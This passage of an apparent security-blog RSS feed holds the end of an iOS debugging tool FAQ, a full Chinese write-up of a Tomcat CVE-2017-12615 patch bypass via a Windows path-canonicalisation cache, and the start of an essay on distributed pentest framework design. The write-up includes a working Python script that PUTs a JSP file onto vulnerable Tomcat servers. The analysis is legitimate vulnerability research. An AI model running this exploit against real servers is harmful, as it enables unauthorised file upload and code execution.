等专门的调试工具。&lt;/p&gt;&lt;h2&gt;FAQ&lt;/h2&gt;&lt;p&gt;&lt;b&gt;需要越狱吗？&lt;/b&gt;&lt;/p&gt;&lt;p&gt;更新：项目发布后收到了 frida 作者本尊贡献的代码，现在已经不需要越狱了！&lt;/p&gt;&lt;p&gt;Frida 可以通过对已砸壳的 ipa 添加 fridagadget.dylib，重打包、重签名后在非越狱设备上试用，具体步骤可参考： &lt;a href=&quot;http://www.jianshu.com/p/ce2770c42ead&quot;&gt;iOS App的Patching和Resigning&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;为什么不支持 NSLog 查看？&lt;/b&gt;&lt;/p&gt;&lt;p&gt;本工具使用的界面是基于浏览器的，对于 NSLog 日志这种快速刷新的内容，实时展示会造成显著的性能问题。在现有工具（Xcode，macOS 自带的 Console，libimoviledevice 的 idevicesyslog 命令）足够强大的情况下，没有必要再开发一个（更难用的）了。&lt;/p&gt;</description>
<author>周知日</author>
<guid isPermaLink="false">2017-10-15-29761306</guid>
<pubDate>Sun, 15 Oct 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>Abuse Cache of WinNTFileSystem : Yet Another Bypass of Tomcat CVE-2017-12615</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2017-09-25-29649377.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;Abuse Cache of WinNTFileSystem : Yet Another Bypass of Tomcat CVE-2017-12615&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/29649377&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-30037f9018107abef8aa559996cbb61b_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;作者：Pocky &lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x01 CVE-2017-12615 补丁分析&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;CVE-2017-12615 是 Tomcat 在设置了 readonly 为 false 状态下，可以通过 PUT 创建一个“.jsp ”的文件。由于后缀名非 .jsp 和 .jspx ，所以 Tomcat 在处理的时候经由 DefaultServlet 处理而不是 JspServlet ，又由于 Windows 不允许文件名为空格结尾，所以可以成功创建一个 JSP 文件，以达到 RCE 的结果。  &lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;龙哥在周五敲我说，在高并发的情况下，还是可以成功写入一个 JSP 文件；同时微博上的一个小伙伴也告诉我，在一定的条件下还是可以成功创建文件。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;测试发现，对于 7.0.81 可以成功复现，但是对于 8.5.21 失败。如下代码分析是基于 Apache Tomcat 7.0.81 的。&lt;/b&gt;经过分析，我发现这两种情况其实本质是相同的。不过在此之前，首先看一下 Tomcat 对于 CVE-2017-12615 的补丁好了。  &lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;同样的，进入 DefaultServlet 的 doPut 方法，再调用到 FileDirContext 的 bind 方法，接着调用 file 方法：  &lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;   protected File file(String name, boolean mustExist) {
        File file = new File(base, name);
        return validate(file, mustExist, absoluteBase);
    }&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;注意到 mustExist 为 false ：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;   protected File validate(File file, boolean mustExist, String absoluteBase) {
    
        if (!mustExist || file.exists() &amp;amp;&amp;amp; file.canRead()) { // !mustExist = true，进入 if
            ...
            try {
                canPath = file.getCanonicalPath(); 
                // 此处，对路径进行规范化，调用的是 java.io.File 内的方法
                // 之前的 Payload 中结尾为空格，那么这个方法就会去掉空格
            } catch (IOException e) {
    
            }
            ...
            if ((absoluteBase.length() &amp;lt; absPath.length())
                &amp;amp;&amp;amp; (absoluteBase.length() &amp;lt; canPath.length())) {
                ...
                // 判断规范化的路径以及传入的路径是否相等，由于 canPath 没有空格，return null
                if (!canPath.equals(absPath))
                    return null;
            }
        } else {
            return null;
        }&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;经过上述的判断，导致我们无法通过空格来创建 JSP 文件。  &lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;但是之前提到，在高并发或者另外一种情况下，却又能创建 JSP 文件，也就是说 canPath.equals(absPath) 为 true 。通过深入分析，找出了其原因。  &lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;0x02 WinNTFileSystem.canonicalize &lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;上述代码中，对于路径的规范化是调用的 file.getCanonicalPath() ：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;   public String getCanonicalPath() throws IOException {
        if (isInvalid()) {
            throw new IOException(&quot;Invalid file path&quot;);
        }
        return fs.canonicalize(fs.resolve(this));
    }&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;也就是调用 FS 的 canonicalize 方法，对于 Windows，调用的是 WinNTFileSystem.canonicalize 。这个 Bypass 的锅也就出在 WinNTFileSystem.canonicalize 里，下面为其代码，我已去处掉了无关代码可以更清晰的了解原因。 &lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;   @Override
    public String canonicalize(String path) throws IOException {
        ...
        if (!useCanonCaches) { // !useCanonCaches = false
            return canonicalize0(path);
        } else {
            // 进入此处分支
            String res = cache.get(path);
            if (res == null) {
                String dir = null;
                String resDir = null;
                if (useCanonPrefixCache) {
                    dir = parentOrNull(path);
                    if (dir != null) {
                        resDir = prefixCache.get(dir);
                        if (resDir != null) {
                            String filename = path.substring(1 + dir.length());
                            // 此处 canonicalizeWithPrefix 不会去掉尾部空格
                            res = canonicalizeWithPrefix(resDir, filename);
                            cache.put(dir + File.separatorChar + filename, res);
                        }
                    }
                }
                if (res == null) {
                    // 此处的 canonicalize0 会将尾部空格去掉
                    res = canonicalize0(path);
                    cache.put(path, res);
                    if (useCanonPrefixCache &amp;amp;&amp;amp; dir != null) {
                        resDir = parentOrNull(res);
                        if (resDir != null) {
                            File f = new File(res);
                            if (f.exists() &amp;amp;&amp;amp; !f.isDirectory()) {
                                prefixCache.put(dir, resDir);
                            }
                        }
                    }
                }
            }
            // 返回路径
            return res;
        }
    }&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;上述代码有一个非常非常神奇的地方：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;canonicalizeWithPrefix(resDir, filename) 不会去掉路径尾部空格&lt;/li&gt;&lt;li&gt;canonicalize0(path) 会去掉路径尾部空格&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;为了满足进入存在 canonicalizeWithPrefix 的分支，需要通过两个判断：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;String res = cache.get(path); 应为 null ，此处 PUT 一个从未 PUT 过的文件名即可&lt;/li&gt;&lt;li&gt;resDir = prefixCache.get(dir); 应不为 null&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;可以发现，对于 prefixCache 进行添加元素的操作在下方存在 canonicalize0 的 if 分支：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;           if (res == null) {
                res = canonicalize0(path);
                cache.put(path, res);
                if (useCanonPrefixCache &amp;amp;&amp;amp; dir != null) {
                    resDir = parentOrNull(res);
                    if (resDir != null) {
                        File f = new File(res);
                        if (f.exists() &amp;amp;&amp;amp; !f.isDirectory()) { // 需要满足条件
                            prefixCache.put(dir, resDir); // 进行 put 操作&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;通过代码可知，如果想在 prefixCache 存入数据，需要满足&lt;b&gt;文件存在&lt;/b&gt;且&lt;b&gt;文件不是目录&lt;/b&gt;的条件。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;prefixCache 存放的是什么数据呢？通过单步调试可以发现：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-c3bda57d16a4c9ce6fd36f4fc5f06193_r.jpg&quot; data-rawwidth=&quot;657&quot; data-rawheight=&quot;250&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;resDir 为文件所在的绝对路径。  &lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;那么如果想进入 canonicalizeWithPrefix 的分支，需要满足的两个条件已经理清楚了。从 prefixCache.put 开始，触发漏洞需要的流程如下。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;0x03 The Exploit&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;首先，要向 prefixCache 中添加内容，那么需要满足 f.exists() &amp;amp;&amp;amp; !f.isDirectory() 这个条件。仍然还是空格的锅：  &lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;   &amp;gt;&amp;gt;&amp;gt; os.path.exists(&quot;C:/Windows/System32/cmd.exe&quot;)
   True
   &amp;gt;&amp;gt;&amp;gt; os.path.exists(&quot;C:/Windows/System32/cmd.exe &quot;)
   True&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;那么，在无已知文件的情况下，我们只需要先 PUT 创建一个 test.txt ，在 PUT  一个 test.txt%20 ，即可向 prefixCache 添加数据了。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-cf3dc76a2af468e27d8b2ffb05e5cf5d_r.jpg&quot; data-rawwidth=&quot;850&quot; data-rawheight=&quot;144&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-c7469352b8428fc259cc53dc156aa20f_r.jpg&quot; data-rawwidth=&quot;949&quot; data-rawheight=&quot;173&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;单步查看，发现已经通过分支，并且向 prefixCache 添加数据：  &lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-bff33dc63d977443793f73b01a09cd15_r.jpg&quot; data-rawwidth=&quot;992&quot; data-rawheight=&quot;467&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;接着，创建一个 JSP 文件 “test.jsp%20” ，单步查看：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-a7d81e24db7ee37733f7fcb497882f79_r.jpg&quot; data-rawwidth=&quot;884&quot; data-rawheight=&quot;625&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;可以发现，resDir 不为 null ，且 res 结尾带着空格。于是可以通过最开始的 canPath.equals(absPath) 的检查。查看 BurpSuite 中的返回：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-6f70c318355bdc1b7c73ac6004204b32_r.jpg&quot; data-rawwidth=&quot;953&quot; data-rawheight=&quot;181&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;发现已经创建成功了。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;Exploit:&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;   import sys
   import requests
   import random
   import hashlib
   shell_content = &#39;&#39;&#39;
   RR is handsome!
   &#39;&#39;&#39;
   if len(sys.argv) &amp;lt;= 1:
       print(&#39;Usage: python tomcat.py [url]&#39;)
       exit(1)
   def main():
       filename = hashlib.md5(str(random.random())).hexdigest()[:6]
       put_url = &#39;{}/{}.txt&#39;.format(sys.argv[1], filename)
       shell_url = &#39;{}/{}.jsp&#39;.format(sys.argv[1], filename)
       requests.put(put_url, data=&#39;1&#39;)
       requests.put(put_url + &#39;%20&#39;, data=&#39;1&#39;)
       requests.put(shell_url + &#39;%20&#39;, data=shell_content)
       requests.delete(put_url)
       print(&#39;Shell URL: {}&#39;.format(shell_url))
   if __name__ == &#39;__main__&#39;:
       main()&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-6734b1aa82d23171b2a2314fbbec15d3_r.jpg&quot; data-rawwidth=&quot;813&quot; data-rawheight=&quot;209&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;0x04 Tomcat 8.5.21!?&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;Tomcat 8.5.21 通过 WebResourceRoot 来处理资源文件：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;   protected transient WebResourceRoot resources = null;
   ...

   @Override
   protected void doPut(HttpServletRequest req, HttpServletResponse resp)
       throws ServletException, IOException {
       ...
       try {
           if (range != null) {
               File contentFile = executePartialPut(req, range, path);
               resourceInputStream = new FileInputStream(contentFile);
           } else {
               resourceInputStream = req.getInputStream();
           }

           if (resources.write(path, resourceInputStream, true)) { // 进入 write
               if (resource.exists()) {
                   resp.setStatus(HttpServletResponse.SC_NO_CONTENT);
               } else {
                   resp.setStatus(HttpServletResponse.SC_CREATED);
               }
           } else {&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;接着调用 DirResourceSet.write ：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;   @Override
   public boolean write(String path, InputStream is, boolean overwrite) {
       path = validate(path);
       if (!overwrite &amp;amp;&amp;amp; preResourceExists(path)) {
           return false;
       }
       // main 为 DirResourceSet 的 instance
       boolean writeResult = main.write(path, is, overwrite);
       ...
   }&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;DirResourceSet.write 的源码为：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;   @Override
   public boolean write(String path, InputStream is, boolean overwrite) {
       checkPath(path);
       if (is == null) {
           throw new NullPointerException(
                   sm.getString(&quot;dirResourceSet.writeNpe&quot;));
       }
       if (isReadOnly()) {
           return false;
       }
       File dest = null;
       String webAppMount = getWebAppMount();
       if (path.startsWith(webAppMount)) {
           // 进入 file 方法
           dest = file(path.substring(webAppMount.length()), false);&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;file 方法：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;   protected final File file(String name, boolean mustExist) {
           ...
           String canPath = null;
           try {
               canPath = file.getCanonicalPath();
           } catch (IOException e) {
               // Ignore
           }
           ...
           if ((absoluteBase.length() &amp;lt; absPath.length())
               &amp;amp;&amp;amp; (canonicalBase.length() &amp;lt; canPath.length())) {
               ...
               if (!canPath.equals(absPath))
                   return null;
           }
       } else {
           return null;
       }
       return file;
   }&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;换汤不换药，为什么不能触发呢？经过单步，发现成功通过判断，但是在文件复制的时候出现了问题：  &lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;   try {
       if (overwrite) {
           Files.copy(is, dest.toPath(), StandardCopyOption.REPLACE_EXISTING); // 此处
       } else {
           Files.copy(is, dest.toPath());
       }
   } catch (IOException ioe) {
       return false;
   }&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;在 toPath 方法的时候出现了问题：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;   public Path toPath() {
       Path result = filePath;
       if (result == null) {
           synchronized (this) {
               result = filePath;
               if (result == null) {
                   result = FileSystems.getDefault().getPath(path);
                   filePath = result;
               }
           }
       }
       return result;
   }&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-1b5c33c929fd404a8c2e5e278f48e6d0_r.jpg&quot; data-rawwidth=&quot;998&quot; data-rawheight=&quot;241&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;WindowsPathParser.normalize 判断是是不是非法的字符：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;   private static String normalize(StringBuilder sb, String path, int off) {
       ...
       while (off &amp;lt; len) {
           char c = path.charAt(off);
           if (isSlash(c)) {
               if (lastC == &#39; &#39;)
                   throw new InvalidPathException(path,
                                                  &quot;Trailing char &amp;lt;&quot; + lastC + &quot;&amp;gt;&quot;,
                                                  off - 1);
           ...
           } else {
               if (isInvalidPathChar(c))
                   throw new InvalidPathException(path,
                                                  &quot;Illegal char &amp;lt;&quot; + c + &quot;&amp;gt;&quot;,
                                                  off);
               lastC = c;
               off++;
           }
       }
       if (start != off) {
           if (lastC == &#39; &#39;)
               throw new InvalidPathException(path,
                                              &quot;Trailing char &amp;lt;&quot; + lastC + &quot;&amp;gt;&quot;,
                                              off - 1);
           sb.append(path, start, off);
       }
       return sb.toString();
   }&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;以及：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;   private static final boolean isInvalidPathChar(char var0) {
       return var0 &amp;lt; &#39; &#39; || &quot;&amp;lt;&amp;gt;:\&quot;|?*&quot;.indexOf(var0) != -1;
   }&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;难过。&lt;/p&gt;</description>
<author>perhaps</author>
<guid isPermaLink="false">2017-09-25-29649377</guid>
<pubDate>Mon, 25 Sep 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>浅谈分布式渗透框架的架构与设计</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2017-08-25-28781870.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;浅谈分布式渗透框架的架构与设计&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/28781870&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-59d6dc5eeea4931774877903a65e57a1_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;本文与大家探讨一些关于分布式渗透框架的架构与设计的话题，分享笔者的一些拙见，希望能对大家有所启发。本文分为三个话题（Topic），建议按顺序阅读，在三个话题中，笔者对两个痛点（架构设计与通信）做了一些细节描述。&lt;/p&gt;&lt;ol&gt;&lt;li&gt;Topic - 渗透测试框架是什么&lt;/li&gt;&lt;li&gt;Topic - 需求分析与架构设计&lt;/li&gt;&lt;li&gt;Topic - 通信与消息队列&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Topic - 渗透测试框架是什么&lt;/b&gt;&lt;/h2&gt;&lt;h2&gt;&lt;b&gt;背景&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;现在很多大小厂家或者很多私人团队都在做或者已经有成熟的扫描器，开源也好内部使用也好。都是为了解决一些实际的问题：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;渗透测试需要&lt;/li&gt;&lt;ul&gt;&lt;li&gt;代替重复手动来动&lt;/li&gt;&lt;li&gt;避免遗漏发生&lt;/li&gt;&lt;li&gt;传承／继承优秀的测试方法&lt;/li&gt;&lt;/ul&gt;&lt;li&gt;作为企业的产品之一&lt;/li&gt;&lt;ul&gt;&lt;li&gt;面向专业用户&lt;/li&gt;&lt;li&gt;面向普通用户&lt;/li&gt;&lt;/ul&gt;&lt;li&gt;灰色产业（BOTNET）&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;简单来说，渗透测试框架能让你的某些渗透测试流程变的更简单，辅助业务完成，简化一些业务逻辑。当然对于框架来说，它的基本功能其实是保证插件的正常运行。当他拥有了很多的插件的时候，价值才会真正体现出来。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;本质&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;渗透测试框架并不是什么特别高深的东西，相比电商系统中的微服务架构，可能基础架构并没有它复杂，甚至相比之下可以说是小巫见大巫了。但是渗透测试框架也并不适合和微服务架构进行对比，因为它更加的灵活，一些高级开发概念（分布式／微服务），对他并不是特别适用。一个渗透测试框架／扫描器，可以非常简洁明了，甚至可以看成一个灵活的脚本引擎，但是同时又存在着很多的大型的渗透框架／扫描框架（Nessus／OpenVAS），这些框架的复杂程度远远高于普通的脚本引擎。说渗透测试框架／扫描器的本质，并不好根据他的特征说具体它是一个什么样的程序：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;一个单机运行／分布式的程序框架&lt;/li&gt;&lt;li&gt;高质量的扫描模块，或者灵活的脚本引擎&lt;/li&gt;&lt;li&gt;稳定的基础设施，逻辑可编程控制&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;&lt;b&gt;解决的问题&lt;/b&gt;&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;代替某些重复的手工劳动&lt;/li&gt;&lt;li&gt;固定逻辑输出&lt;/li&gt;&lt;li&gt;稳定的输出&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;&lt;b&gt;不能解决的问题&lt;/b&gt;&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;带有复杂逻辑的漏洞无法检测&lt;/li&gt;&lt;li&gt;分布式渗透框架设计与实现难度高&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;&lt;b&gt;普适性的规则&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;对于一个这种框架来说，再简化简化简化模型，它最终会变成一个 RPC（Remote Procedure Call）调用多种程序（功能单元）的框架，当然这里不是说具体的 RPC 协议，而是一个泛化的 RPC 的概念；或者变成一个直接调用多种程序（功能单元）的框架。&lt;/p&gt;&lt;p&gt;与普通 RPC 最大的差别就是：任务种类多样，任务可能存在更新的情况，执行任务环境非常复杂。而且框架本身需要支持高度灵活的功能单元（插件）。或者用另一句话来说，被调用的程序（功能模块）对于框架来说，是非常非常松散的，甚至失效／过时都不会影响任何框架的运行。&lt;/p&gt;&lt;p&gt;这样来说，它又不能简单的说是一个 RPC，基于上述的情形，他在设计的时候，排除后期模块注册等机制，框架本身是不能主动知道他会有多少种类，多少数量的程序可以让他在远程调用，同时也不知道这些程序的基础接口到底是什么。因此用 RPC 来描述，又不是特别恰当。&lt;/p&gt;&lt;p&gt;那么，在对于框架来说，我们最好采用哪种形式来描述？当然，每个人有每个人的看法，我更偏向于使用 &lt;b&gt;松散的主从架构（Loose Master-Slave）&lt;/b&gt; 这样的描述来作为这类框架的架构模型：自然 Slave 表示功能单元或者被调用的程序，Master 则代表控制器／调用者或者整体事务逻辑处理的节点，Loose 则代表了 Slave 和 Master 之间的关系，相互的依赖性不是特别的强，可以采用其他的机制来维护他们之间的联系，比如注册或订阅机制等。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;补充说明&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;当然框架和渗透测试工具是不一样的，工具大可直接使用分层架构，甚至可以不用太注意项目模型和结构相关的部分，直接面向过程实现某一些特定功能，或者部分或者整体使用微内核架构提供一定的灵活性。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;现主流扫描器／框架的模型分类&lt;/b&gt;&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;单机与分布式：本文中单机与分布式的最大的区别不是是否联网，而是具体的执行任务的工作节点是否在一台机器上。&lt;/li&gt;&lt;li&gt;微内核架构：这种架构非常灵活，既可以作为部分也可以作为整体框架使用。比如常见的脚本引擎：Nmap 的 NSE 系统，SQLMAP 的 Tamper 机制等等，其实可以说用到了微内核模型的一些思想。&lt;/li&gt;&lt;li&gt;微内核与主从：微内核采用主从模型，在一定程度上解耦功能模块。&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-8c583d205528f259751b8ca0dda81fcc_r.png&quot; data-rawwidth=&quot;1462&quot; data-rawheight=&quot;762&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;在下一个话题中，我们讨论分布式渗透框架／扫描器的架构设计相关的话题。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Topic - 需求分析与架构设计&lt;/b&gt;&lt;/h2&gt;&lt;h2&gt;&lt;b&gt;背景&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;简单来说这个框架的任务就是，接收任务，分发任务，执行任务，处理结果，因此分布式渗透测试框架相对于电商平台的微服务架构要简单很多，因为渗透测试框架的事务相对更佳简单一些，甚至可以说淡化事务这个概念。但是又属于任务密集型的应用，一定程度上高并发和高可用性又存在一定的需求。&lt;/p&gt;&lt;p&gt;我们可以从头梳理一下整个过程，Master 得到一个任务，这个任务被分为几个原子任务，按照种类被送给了不同的 Worker，然后任务执行之后，结果被发送会 Master，进行事务汇总。&lt;/p&gt;&lt;p&gt;整个过程虽然并不是非常的复杂，但是我们还是需要分析一下我们到底需要什么才能针对需求作出合理的架构设计&lt;/p&gt;&lt;h2&gt;&lt;b&gt;需求&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;思考了很多关于需求描述的方法，我们没有办法只从一个角度很好的描述我们的系统到底需要什么样的功能，这就好比我们有了 OOP，但是 AOP 的出现进行了对 OOP 非常好的补充，当然还有 SOP（面向状态编程）也对 OOP 的起到了很好的补充。啊，话题扯远了，经过一些思考，分别从空间和时间（过程／逻辑）两个角度来讨论我们的需求。&lt;/p&gt;&lt;ul&gt;&lt;li&gt;空间角度是指对象，行为，数据，实体角度与传统的 OOP 的思考角度类似，就不做过多的赘述了。&lt;/li&gt;&lt;li&gt;时间／过程／逻辑角度指的是我们从个行为从开始到结束整个过程来思考问题，就比如，从 Master 到 Slave 通信的整个过程，一个事务的生存周期（任务从产生到结束或者被丢弃），一个模块的生存周期，一个存在主逻辑的调度过程等。&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;&lt;b&gt;空间需求&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;从功能实体的角度来说，我们大概需要这样的东西：&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Master&lt;/b&gt;&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;事务管理&lt;/li&gt;&lt;ul&gt;&lt;li&gt;任务接收&lt;/li&gt;&lt;li&gt;任务分发&lt;/li&gt;&lt;li&gt;结果收集&lt;/li&gt;&lt;/ul&gt;&lt;li&gt;节点管理&lt;/li&gt;&lt;ul&gt;&lt;li&gt;节点审计（Inspect）&lt;/li&gt;&lt;li&gt;节点启停（Start / Stop）&lt;/li&gt;&lt;/ul&gt;&lt;li&gt;用户管理&lt;/li&gt;&lt;ul&gt;&lt;li&gt;略&lt;/li&gt;&lt;/ul&gt;&lt;/ul&gt;&lt;h2&gt;&lt;b&gt;Slave&lt;/b&gt;&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;状态无关&lt;/li&gt;&lt;li&gt;事务处理&lt;/li&gt;&lt;ul&gt;&lt;li&gt;任务执行&lt;/li&gt;&lt;li&gt;结果返回&lt;/li&gt;&lt;/ul&gt;&lt;li&gt;节点管理&lt;/li&gt;&lt;ul&gt;&lt;li&gt;节点状态汇报&lt;/li&gt;&lt;/ul&gt;&lt;/ul&gt;&lt;h2&gt;&lt;b&gt;时间／过程／逻辑需求&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;当然这里指的是本框架中为了解决问题从而需要的一系列的机制或者可能出现的过程或者逻辑&lt;/p&gt;&lt;ul&gt;&lt;li&gt;通信系统（稍后会详细讨论）&lt;/li&gt;&lt;li&gt;事务系统&lt;/li&gt;&lt;ul&gt;&lt;li&gt;任务管理系统&lt;/li&gt;&lt;li&gt;结果管理系统&lt;/li&gt;&lt;/ul&gt;&lt;li&gt;功能模块引擎&lt;/li&gt;&lt;li&gt;高度模块化：指的是模块之间高度独立，极低耦合甚至没有耦合&lt;/li&gt;&lt;li&gt;使用脚本引擎提升灵活性：针对不必要新建模块的小型任务，仅使用一个脚本引擎来敏捷启动和执行任务&lt;/li&gt;&lt;li&gt;对框架的低依赖：模块按照一定规范编写而成，不需要向框架提供任何接口&lt;/li&gt;&lt;li&gt;接口统一，但是模块本身环境的多样性：模块可以是任意的语言，任意的环境，任意容器，但是模块的接口必须是框架可以接受的&lt;/li&gt;&lt;li&gt;调度系统&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;存在一个可以让模块协同工作的调度系统。&lt;/p&gt;&lt;ol&gt;&lt;li&gt;用户接口（略）&lt;/li&gt